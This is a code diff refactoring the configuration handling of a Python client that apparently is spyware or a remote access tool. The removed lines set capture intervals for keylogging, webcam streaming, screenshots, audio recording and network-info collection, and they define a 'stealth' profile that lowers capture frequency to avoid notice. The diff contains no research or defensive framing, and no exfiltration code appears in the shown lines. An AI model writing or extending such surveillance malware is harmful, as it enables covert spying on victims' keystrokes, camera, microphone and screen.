@@ -113,7 +113,6 @@ class ClientApp:
                 while True:
                     time.sleep(60)
             except KeyboardInterrupt:
-                # print("\nShutting down...")
                 self.__stop__()
         except Exception as e:
             data = e.args[0] if e.args else None
@@ -375,110 +374,18 @@ class ClientApp:
             raise ClientError("Get Config Error - " + str(e), "error")
     
     def set_config(self, param, value) -> bool:
-        """
-        Set a configuration parameter
-        Args:
-            param: Parameter name
-            value: New value
-        Returns:
-            bool: True if successful
-        """
-        
+        """ Set a configuration parameter """
         try:
-            try:
-                # Validate and convert value
-                if param in ['keylogger_interval', 'webcam_interval', 'screenshot_interval', 
-                            'network_info_interval', 'audio_duration', 'audio_interval',
-                            'webcam_stream_fps', 'webcam_stream_quality', 'screenshot_quality']:
-                    value = int(value)
-                
-                elif param == 'webcam_stream_resolution':
-                    # Parse resolution like "640x480" or "(640, 480)"
-                    if isinstance(value, str):
-                        if 'x' in value:
-                            width, height = value.split('x')
-                            value = (int(width), int(height))
-                        else:
-                            value = tuple(map(int, value.strip('()').split(',')))
-                
-                # Set the value
-                if hasattr(self, param):
-                    setattr(self, param, value)
-                    return True
-                else:
-                    return False
-            
-            except Exception as e:
-                return False
+            return self.config.set_config(param, value)
         except Exception as e:
             raise ClientError("Set Config Error - " + str(e), "error")
     
     def load_profile(self, profile_name) -> bool:
-        """
-        Load a predefined configuration profile
-        Args:
-            profile_name: Name of the profile
-        Returns:
-            bool: True if successful
-        """
-
+        """ Load a configuration profile """
         try:
-            profiles = {
-                'stealth': {
-                    'keylogger_interval': 10,
-                    'webcam_interval': 300,
-                    'screenshot_interval': 300,
-                    'webcam_stream_fps': 5,
-                    'webcam_stream_quality': 40,
-                    'screenshot_quality': 60,
-                    'network_info_interval': 600,
-                    'audio_duration': 5,
-                    'audio_interval': 300
-                },
-                'performance': {
-                    'keylogger_interval': 2,
-                    'webcam_interval': 10,
-                    'screenshot_interval': 20,
-                    'webcam_stream_fps': 30,
-                    'webcam_stream_quality': 90,
-                    'screenshot_quality': 95,
-                    'network_info_interval': 60,
-                    'audio_duration': 30,
-                    'audio_interval': 30
-                },
-                'balanced': {
-                    'keylogger_interval': 5,
-                    'webcam_interval': 30,
-                    'screenshot_interval': 60,
-                    'webcam_stream_fps': 10,
-                    'webcam_stream_quality': 60,
-                    'screenshot_quality': 85,
-                    'network_info_interval': 300,
-                    'audio_duration': 10,
-                    'audio_interval': 60
-                },
-                'minimal': {
-                    'keylogger_interval': 30,
-                    'webcam_interval': 600,
-                    'screenshot_interval': 600,
-                    'webcam_stream_fps': 3,
-                    'webcam_stream_quality': 30,
-                    'screenshot_quality': 50,
-                    'network_info_interval': 1800,
-                    'audio_duration': 5,
-                    'audio_interval': 600
-                }
-            }
-            
-            if profile_name in profiles:
-                profile = profiles[profile_name]
-                for param, value in profile.items():
-                    setattr(self, param, value)
-                return True
-            
-            return False
+            return self.config.load_profile(profile_name)
         except Exception as e:
             raise ClientError("Load Profile Error - " + str(e), "error")
-        
+            
 if __name__ == "__main__":
     app = ClientApp()
